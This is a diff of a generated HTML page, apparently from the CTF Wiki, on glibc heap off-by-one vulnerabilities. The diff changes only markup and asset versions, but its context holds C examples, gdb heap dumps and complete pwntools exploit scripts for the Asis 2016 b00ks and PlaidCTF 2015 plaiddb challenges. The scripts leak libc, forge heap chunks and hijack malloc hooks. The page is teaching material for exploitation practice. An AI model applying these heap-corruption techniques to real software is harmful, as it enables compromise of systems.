@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4814,7 +4814,7 @@ In addition, the point to note is that off-by-one can be based on various buffer
 <li>The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the <code>prev_in_use</code> bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the <code>prev_size</code> field is enabled, you can forge <code>prev_size</code>, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by <code>prev_size</code> (theoretically the block currently unlinked) is equal to the block size currently being unlinked.</li>
 </ol>
 <p>In the latest version of the code, the check for the latter method in 2 has been added, but the check was not available before 2.28.</p>
-<div class="codehilite"><pre><span></span>/* consolidate backward */
+<div class="codehilite"><pre><span></span><code>/* consolidate backward */
 
     if (!prev_inuse(p)) {
 
@@ -4831,10 +4831,10 @@ In addition, the point to note is that off-by-one can be based on various buffer
 
 unlink_chunk (av, p);
     }
-</pre></div>
+</code></pre></div>
 
 <h3 id="example-1">Example 1<a class="headerlink" href="#example-1" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>int my_gets(char *ptr,int size)
+<div class="codehilite"><pre><span></span><code>int my_gets(char *ptr,int size)
 
 {
 
@@ -4869,7 +4869,7 @@ int main()
     return 0;
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>Our own my_gets function caused an off-by-one vulnerability because the boundaries of the for loop were not controlled enough to cause writes to be executed once, which is also called a fence error.</p>
 <blockquote>
@@ -4881,28 +4881,28 @@ int main()
 <blockquote></blockquote>
 <p>&gt; The easiest answer 10 is wrong. This fence has 10 intervals and 11 fence posts.</p>
 <p>We use gdb to debug the program. Before inputting, we can see that the two allocated user areas are 16-byte heap blocks.
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
 
 0x602010:   0x0000000000000000  0x0000000000000000
 
 0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
 
 0x602030:   0x0000000000000000  0x0000000000000000
-</pre></div></p>
+</code></pre></div></p>
 <p>When we execute my_gets for input, we can see that the data has overflowed to cover the prev_size field of the next heap.
 print 'A'*17</p>
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
 
 0x602010:   0x4141414141414141  0x4141414141414141
 
 0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2
 
 0x602030:   0x0000000000000000  0x0000000000000000
-</pre></div>
+</code></pre></div>
 
 <h3 id="example-2">Example 2<a class="headerlink" href="#example-2" title="Permanent link">&para;</a></h3>
 <p>The second common scenario that causes off-by-one is string manipulation. The common reason is that the end of the string is incorrectly calculated.</p>
-<div class="codehilite"><pre><span></span>int main(void)
+<div class="codehilite"><pre><span></span><code>int main(void)
 
 {
 
@@ -4929,37 +4929,37 @@ print 'A'*17</p>
 
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>At first glance, the program doesn&#39;t seem to have any problems (regardless of stack overflow), and many people may write it in the actual code as well.
 However, the behavior of strlen and strcpy is inconsistent, which leads to the occurrence of off-by-one.
 Strlen is a function we are familiar with calculating the length of an ascii string. This function does not count the terminator <code>&amp;#39;\x00&amp;#39;</code> when calculating the length of a string, but strcpy copies the terminator when copying a string. &#39;\x00&#39;`. This caused us to write 25 bytes to chunk1, which we can see with gdb debugging.</p>
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
 
 0x602010:   0x0000000000000000  0x0000000000000000
 
 0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk
-</pre></div>
+</code></pre></div>
 
 <p>Execute strcpy after we type &#39;A&#39;*24</p>
-<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021
+<div class="codehilite"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021
 
 0x602010:   0x4141414141414141  0x4141414141414141
 
 0x602020:   0x4141414141414141  0x0000000000000400
-</pre></div>
+</code></pre></div>
 
 <p>You can see that the low byte of the size field of the next chunk is overwritten by the terminator <code>&amp;#39;\x00&amp;#39;</code>. This branch of the off-by-one is called NULL byte off-by-one, which we will see later. The difference between off-by-one and NULL byte off-by-one.
 There is still one thing why the low byte is overwritten, because the byte order of the CPU we usually use is small endian, such as a DWORD value stored in the memory using the little endian method.</p>
-<div class="codehilite"><pre><span></span>DWORD 0x41424344
+<div class="codehilite"><pre><span></span><code>DWORD 0x41424344
 
 Memory 0x44, 0x43, 0x42, 0x41
-</pre></div>
+</code></pre></div>
 
 <h2 id="1-asis-ctf-2016-b00ks">实例 1: Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a><a class="headerlink" href="#1-asis-ctf-2016-b00ks" title="Permanent link">&para;</a></h2>
 <h3 id="title-introduction">Title introduction<a class="headerlink" href="#title-introduction" title="Permanent link">&para;</a></h3>
 <p>The topic is a common menu-style program that features a library management system.</p>
-<div class="codehilite"><pre><span></span>1. Create a book
+<div class="codehilite"><pre><span></span><code>1. Create a book
 
 2. Delete a book
 
@@ -4970,10 +4970,10 @@ Memory 0x44, 0x43, 0x42, 0x41
 5. Change current author name
 
 6. Exit
-</pre></div>
+</code></pre></div>
 
 <p>The program provides the ability to create, delete, edit, and print books. The title is a 64-bit program and the protection is as follows.</p>
-<div class="codehilite"><pre><span></span>Canary                        : No
+<div class="codehilite"><pre><span></span><code>Canary                        : No
 
 NX                            : Yes
 
@@ -4982,10 +4982,10 @@ PIE                           : Yes
 Fortify                       : No
 
 RelRO                         : Full
-</pre></div>
+</code></pre></div>
 
 <p>Each time a program creates a program, it allocates a 0x20 byte structure to maintain its information.</p>
-<div class="codehilite"><pre><span></span>struct book
+<div class="codehilite"><pre><span></span><code>struct book
 
 {
 
@@ -4998,31 +4998,31 @@ RelRO                         : Full
     int size;
 
 }
-</pre></div>
+</code></pre></div>
 
 <h3 id="create">create<a class="headerlink" href="#create" title="Permanent link">&para;</a></h3>
 <p>Name and description exist in the book structure, and name and description are allocated on the heap. First allocate the name buffer, use malloc, the size is custom but less than 32.</p>
-<div class="codehilite"><pre><span></span>printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);
+<div class="codehilite"><pre><span></span><code>printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);
 
 __isoc99_scanf(&quot;%d&quot;, &amp;size);
 
 printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);
 
 ptr = malloc(size);
-</pre></div>
+</code></pre></div>
 
 <p>The description is then assigned, the same size is customizable but unlimited.</p>
-<div class="codehilite"><pre><span></span>printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);
+<div class="codehilite"><pre><span></span><code>printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);
 
         __isoc99_scanf(&quot;%d&quot;, &amp;size);
 
 
 
 v5 = malloc(size);
-</pre></div>
+</code></pre></div>
 
 <p>After allocating the memory of the book structure</p>
-<div class="codehilite"><pre><span></span>book = malloc(0x20uLL);
+<div class="codehilite"><pre><span></span><code>book = malloc(0x20uLL);
 
 if ( book )
 
@@ -5041,11 +5041,11 @@ if ( book )
     return 0LL;
 
 }
-</pre></div>
+</code></pre></div>
 
 <h3 id="vulnerability">Vulnerability<a class="headerlink" href="#vulnerability" title="Permanent link">&para;</a></h3>
 <p>There is a null byte off-by-one vulnerability in the read function of the program. If you look closely at the read function, you can find that the consideration of the boundary is not appropriate.</p>
-<div class="codehilite"><pre><span></span>signed __int64 __fastcall my_read(_BYTE *ptr, int number)
+<div class="codehilite"><pre><span></span><code>signed __int64 __fastcall my_read(_BYTE *ptr, int number)
 
 {
 
@@ -5083,12 +5083,12 @@ buf = ptr;
   return 0LL;
 
 }
-</pre></div>
+</code></pre></div>
 
 <h3 id="use">Use<a class="headerlink" href="#use" title="Permanent link">&para;</a></h3>
 <h4 id="leak">Leak<a class="headerlink" href="#leak" title="Permanent link">&para;</a></h4>
 <p>Because the my_read function in the program has a null byte off-by-one , in fact the terminator &#39;\x00&#39; read by my_read is written to 0x555555756060. This will overwrite the terminator &#39;\x00&#39; when 0x555555756060~0x555555756068 is written to the book pointer, so there is a vulnerability in the address leak. The value of the first item in the pointer array can be obtained by printing the author name.</p>
-<div class="codehilite"><pre><span></span>0x555555756040: 0x6161616161616161  0x6161616161616161
+<div class="codehilite"><pre><span></span><code>0x555555756040: 0x6161616161616161  0x6161616161616161
 
 0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name
 
@@ -5097,10 +5097,10 @@ buf = ptr;
 0x555555756070: 0x0000000000000000  0x0000000000000000
 
 0x555555756080: 0x0000000000000000  0x0000000000000000
-</pre></div>
+</code></pre></div>
 
 <p>In order to achieve the leak, first enter 32 bytes in the author name to make the terminator overwritten. After that we create book1, the pointer of book1 will overwrite the last NULL byte in author name, so that the pointer is directly connected with author name, so that the output author name can get a heap pointer.</p>
-<div class="codehilite"><pre><span></span>io.recvuntil(&#39;Enter author name:&#39;) # input author name
+<div class="codehilite"><pre><span></span><code>io.recvuntil(&#39;Enter author name:&#39;) # input author name
 
 io.sendline (&amp;#39;a&amp;#39; * 32)
 
@@ -5129,12 +5129,12 @@ io.recvuntil (&amp;#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#39;) # &amp;lt;== l
 book1_addr = io.recv (6)
 book1_addr = book1_addr.ljust (8, &amp;#39;x00&amp;#39;)
 book1_addr = u64(book1_addr)
-</pre></div>
+</code></pre></div>
 
 <h4 id="off-by-one-override-pointer-low-byte">off-by-one Override pointer low byte<a class="headerlink" href="#off-by-one-override-pointer-low-byte" title="Permanent link">&para;</a></h4>
 <p>The change function is also provided in the program. The change function is used to modify the author name, so the change can be used to write the author name, and the off-by-one is used to override the low byte of the first item of the pointer array.</p>
 <p>After overwriting the low byte of the book1 pointer, this pointer points to the description of book1. Since the program provides the edit function, the content in the description can be arbitrarily modified. We can pre-define the data in the description to create a book structure. The description and name pointers of this book structure can be directly controlled.</p>
-<div class="codehilite"><pre><span></span>def off_by_one(addr):
+<div class="codehilite"><pre><span></span><code>def off_by_one(addr):
 
     addr += 58
 
@@ -5157,7 +5157,7 @@ io.sendline ( &amp;#39;5&amp;#39;)
     io.recvuntil(&#39;Enter author name:&#39;)
 
     io.sendline(&#39;a&#39; * 32) # &lt;== off-by-one
-</pre></div>
+</code></pre></div>
 
 <p>Here, the book is forged in the description, and the data used is p64(0x1)+p64(addr)+p64(addr)+pack(0xffff).
 Where addr+58 is to point the pointer to the pointer address of book2, so that we can modify these pointer values arbitrarily.</p>
@@ -5165,7 +5165,7 @@ Where addr+58 is to point the pointer to the pointer address of book2, so that w
 <p>Through the previous two parts, we have obtained the ability to read and write at any address. The reader may find that the following operations are obvious, such as writing the get table hijacking process or writing the __malloc_hook hijacking process. But the special thing about this topic is that PIE is turned on and there is no way to leak the libc base address, so we need to think about other methods.</p>
 <p>The clever thing about this is that when you allocate a second book, use a large size to make the heap expand in mmap mode. We know that there are two ways to expand the heap. One is that brk will directly expand the original heap, and the other is that mmap will map a piece of memory separately.</p>
 <p>Here we apply for an oversized block to extend memory using mmap. Because the memory allocated by mmap has a fixed offset from libc, the base address of libc can be derived.
-<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path
+<div class="codehilite"><pre><span></span><code>Start              End                Offset             Perm Path
 
 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123
 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123
@@ -5197,8 +5197,8 @@ Where addr+58 is to point the pointer to the pointer address of book2, so that w
 0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]
 
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-</pre></div></p>
-<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path
+</code></pre></div></p>
+<div class="codehilite"><pre><span></span><code>Start              End                Offset             Perm Path
 
 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123
 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123
@@ -5230,10 +5230,10 @@ Where addr+58 is to point the pointer to the pointer address of book2, so that w
 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
 
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-</pre></div>
+</code></pre></div>
 
 <h4 id="exploit">exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;info&quot;</span>
 
@@ -5382,13 +5382,13 @@ Where addr+58 is to point the pointer to the pointer address of book2, so that w
 
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="simple-plan">Simple plan<a class="headerlink" href="#simple-plan" title="Permanent link">&para;</a></h4>
 <p>After any read and write, another way to find libc is to first cause the libc address to be written on the heap before any read and write, and then read it out by any read.</p>
 <p>In order to find the offset where libc is located, you can debug directly through gdb to view the location of the specific libc address on the heap, without deliberate calculation.</p>
 <p>Exp is as follows:</p>
-<div class="codehilite"><pre><span></span>#! /usr/bin/env python2
+<div class="codehilite"><pre><span></span><code>#! /usr/bin/env python2
 
 # -*- coding: utf-8 -*-
 
@@ -5628,10 +5628,10 @@ payload = p64 (0) + p64 (0x101) + p64 (ptr - 0x18) + p64 (ptr - 0x10) + &amp;#39
 if __name__ == &#39;__main__&#39;:
 
     main()
-</pre></div>
+</code></pre></div>
 
 <h2 id="instance-2-plaidctf-2015-plaiddb">Instance 2 : plaidctf 2015 plaiddb<a class="headerlink" href="#instance-2-plaidctf-2015-plaiddb" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> file datastore
+<div class="codehilite"><pre><span></span><code>➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> file datastore
 
 datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>1a031710225e93b0b5985477c73653846c352add, stripped
 
@@ -5652,12 +5652,12 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
     FORTIFY:  Enabled
 
 ➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>As you can see, the program is 64-bit dynamically linked. The protection is all turned on.</p>
 <h3 id="functional-analysis">Functional Analysis<a class="headerlink" href="#functional-analysis" title="Permanent link">&para;</a></h3>
 <p>Key data structure:</p>
-<div class="codehilite"><pre><span></span>struct Node {
+<div class="codehilite"><pre><span></span><code>struct Node {
 
 char * key;
     long data_size;
@@ -5673,11 +5673,11 @@ char * key;
     long dummy1;
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>The structure of the binary tree is mainly used to store data, and the specific storage process does not affect the utilization.</p>
 <p>The function function needs to pay attention to <code>getline</code> (self-implemented single-line read function):</p>
-<div class="codehilite"><pre><span></span>char *__fastcall getline(__int64 a1, __int64 a2)
+<div class="codehilite"><pre><span></span><code>char *__fastcall getline(__int64 a1, __int64 a2)
 
 {
 
@@ -5741,10 +5741,10 @@ v3 = &amp;amp; v8 [v7];
   return v2;
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>Several main features:</p>
-<div class="codehilite"><pre><span></span>unsigned __int64 main_fn()
+<div class="codehilite"><pre><span></span><code>unsigned __int64 main_fn()
 
 {
 
@@ -5807,10 +5807,10 @@ v3 = &amp;amp; v8 [v7];
   return __readfsqword(0x28u) ^ v2;
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>Both <code>dump</code> and <code>get</code> are used to read the content, so <code>key</code> and specific data content can be read, and less attention is needed. Focus on <code>put</code> and <code>del</code>:</p>
-<div class="codehilite"><pre><span></span>__int64 __fastcall cmd_put()
+<div class="codehilite"><pre><span></span><code>__int64 __fastcall cmd_put()
 
 {
 
@@ -5914,7 +5914,7 @@ __int64 v4; // rbp
   return result;
 
 }
-</pre></div>
+</code></pre></div>
 
 <p>The distribution process is:</p>
 <p>Malloc (0x38) (structure)
@@ -5952,7 +5952,7 @@ __int64 v4; // rbp
 <p>Now we need to know the specific methods we need to adopt. First, the <code>off-by-one</code> vulnerability can cause heap crossover, which can cause the libc address to leak. Afterwards, the utilization method to be used, because there is already a heap crossover, that is, a UAF can be formed, and the UAF common method can be used.</p>
 <p>The easiest way to get a UAF vulnerability is of course fastbin attack, so I used fastbin attack.</p>
 <p>Here, we can begin to think about how to form the conditions of use we need. The final effect of <code>off-by-one</code> is that you can release a smallbin chunk or unsortedbin chunk of a released state until it is merged into a large chunk by the overflow chunk. That is:</p>
-<div class="codehilite"><pre><span></span>+------------+
+<div class="codehilite"><pre><span></span><code>+------------+
 
 | | &amp;lt;-- free unsortedbin or smallbin chunk (because fd and bk point to legal pointers at this time, unlink can be done)
 +------------+
@@ -5965,7 +5965,7 @@ __int64 v4; // rbp
 
 | vuln | &amp;lt;-- The chunk that was overflowed, the size is 0x_00 (eg 0x100, 0x200...)
 +------------+
-</pre></div>
+</code></pre></div>
 
 <p>After the use of <code>off-by-one</code>, the chunks that appear above will be merged into a freed chunk. If the position of any intermediate chunk is already allocated, it can cause overlap.</p>
 <p>According to our utilization ideas, combined with the topic <code>getline</code> function through <code>malloc(8)</code> and then <code>realloc</code>, we need to:</p>
@@ -5977,7 +5977,7 @@ __int64 v4; // rbp
 <li>The size of the chunk that overflows should belong to unsortedbin or smallbin. It cannot be fastbin. Otherwise, after being released, according to the allocation method of <code>getline</code>, <code>malloc(8)</code> cannot be allocated at this location.</li>
 </ol>
 <p>According to the above principles, we can think about the distribution of chunks as follows:</p>
-<div class="codehilite"><pre><span></span>+------------+
+<div class="codehilite"><pre><span></span><code>+------------+
 
 |      1     |  &lt;-- free 的 size == 0x200 chunk
 
@@ -5998,14 +5998,14 @@ __int64 v4; // rbp
 
 | X | &amp;lt;-- arbitrarily allocated chunks prevent top merge
 +------------+
-</pre></div>
+</code></pre></div>
 
 <p>Since the allocation process has some additional structure (the allocation of the structure itself and <code>getline</code>), we need to release enough fastbin chunks to avoid the allocation of the structure itself affecting our process.</p>
 <p>After that, release 5, 3, 1, and then use <code>delline</code> when <code>del</code> is input, fill 3, causing <code>off-by-one</code>, then merge 4 <code>free</code> to merge (forgery <code>prev_size</code>), so there is a cross heap structure.</p>
 <p>The process is much simpler. First allocate the size of 1 so that the libc address is written to 2, you can leak the address, then allocate 5 and write the required content, you can fastbin attack.</p>
 <h3 id="exploit_1">exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
 <p>Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10.</p>
-<div class="codehilite"><pre><span></span><span class="ch">#! /usr/bin/env python2</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#! /usr/bin/env python2</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="c1"># vim:fenc=utf-8</span>
 
@@ -6114,7 +6114,7 @@ __int64 v4; // rbp
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
                 
                   
                 
@@ -6180,7 +6180,7 @@ __int64 v4; // rbp
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -6195,7 +6195,7 @@ __int64 v4; // rbp
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
